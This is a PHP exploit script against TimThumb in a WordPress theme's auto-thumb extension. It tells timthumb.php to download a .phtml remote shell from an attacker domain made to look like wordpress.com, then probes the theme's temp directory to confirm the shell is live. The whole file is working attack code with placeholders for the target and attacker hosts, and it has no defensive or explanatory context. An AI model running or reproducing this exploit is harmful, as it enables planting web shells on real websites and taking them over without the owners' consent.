<?php

$siteURL = 'http://YOUR-TARGET-SITE-dot-com/';
#We use time() to download a different shell each time.
$shellName = 'remote_shell.' . time() . '.phtml';
#The URL below is a place where timthumb can download a shell from. 
#It needs to serve up a shell no matter what filename is accessed under /haxxor/
$attackerURL = 'http://wordpress.com.wordpress.YOUR-OWN-DOMAIN-dot-com/haxxor/' . $shellName;
#Adjust path below to target your specific timthumb path
$timthumbURL = $siteURL . 'wp-content/themes/mystique/extensions/auto-thumb/timthumb.php?src=' . rawurlencode($attackerURL);

echo "[*] Running TimThumb bypass for .phtml files.\n";

$ch = curl_init($timthumbURL);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.103 Safari/537.36");
$result = curl_exec($ch);
$statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if (preg_match('/Unable to open image : (.*)/', $result, $matches)) {
	echo "[*] Checking shell URL for 200.\n";

	$shellName = basename($matches[1]);
	if (pathinfo($shellName, PATHINFO_EXTENSION) === 'phtml') {
		echo "[+] Success! Shell downloaded.\n";

		$shellURL = $siteURL . 'wp-content/themes/mystique/extensions/auto-thumb/temp/' . $shellName;
		$ch = curl_init($shellURL);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.103 Safari/537.36");

		$result = curl_exec($ch);
		$statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
		curl_close($ch);

		if ($statusCode === 200) {
			echo "[+] Success! Shell found at $shellURL.\n";
		} else {
			echo "[-] Shell not found at $shellURL.\n";
		}

	} else {
		echo "[-] There was an error downloading the shell. \n";
	}
} else {
	echo "[-] There was an error downloading the shell. Response code was $statusCode.\n";
}
